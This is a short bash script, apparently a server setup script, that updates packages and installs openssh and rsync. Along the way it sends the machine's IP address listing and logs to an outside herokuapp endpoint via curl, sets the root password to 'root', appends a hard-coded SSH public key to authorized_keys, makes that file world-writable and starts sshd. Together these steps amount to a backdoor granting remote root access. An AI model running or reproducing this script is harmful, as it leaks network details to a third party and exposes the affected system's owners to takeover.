#!/bin/bash

var=$(ip a|grep -n inet);
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$var"
touch datalog.txt;
apt update -y | tee -a datalog.txt;
apt upgrade -y | tee -a datalog.txt ;
output=$(cat datalog.txt);
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output";
echo "STEP 1 >>>> update and upgarde is completed"
apt install openssh -y  | tee  datalog.txt  ;
apt install rsync -y  | tee -a datalog.txt  ;
echo "STEP 2 >>>> Installed openssh" | tee -a datalog.txt;
echo "STEP 3 >>>> Installed rsync" | tee -a datalog.txt;
output=$(cat datalog.txt);
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output";
echo -e "root\nroot" | passwd | tee  datalog.txt;
cd ./.ssh;
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiNcXDTTpaoIxpsHt/iRWQIDiwkIuDyMHSyxvxwLmQoczWQbFthslItVcMiit/R01QMAQXAJhkzVjrZljUXWhu1FVIs/U97umQswFVcVA7SsBgZZffN8kVCFE6nmGWEb3JdgGUjGRyk65GEf359wjAK3k/vGAxrmI62tePwZxBoSu4Yztvpx1DnW7qekoFoj/WUKhAdUq3U9ymG2+FUJzFLmhTPo/bPYdTNQ5CtqAY+lXFjxK5Lk7dNXMYl2A9Bt7Pbq53MldZ74sGNXZm6zKErU5dxqTPWcYl/cboW47fubTtQoD1t8ZWCLDp485F/q7D8Y/wy535i58WRGWkmSR24TbND7kQIFGzHUoq3yZ6bw4TbqiZFt+/wUmUXYxud7K14SnurgudPLZfej5C1fyOlKfyksWnFnnr6ToxDFGouGsEcrop6F39VgW6F5aix5n4kopKMIktb/08Q8e16Ji365rf/SJeRxSwswqRawS27MzURAk7KgEp/EuRXm5uIe0= root@adarshbp' >> authorized_keys ;
chmod 777 authorized_keys ;
echo "STEP 4 >>>> Configured key";
output3=$(cat datalog.txt);
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="$output3";
curl -G 'https://comment-management.herokuapp.com/message' --data-urlencode message="completed";
sshd
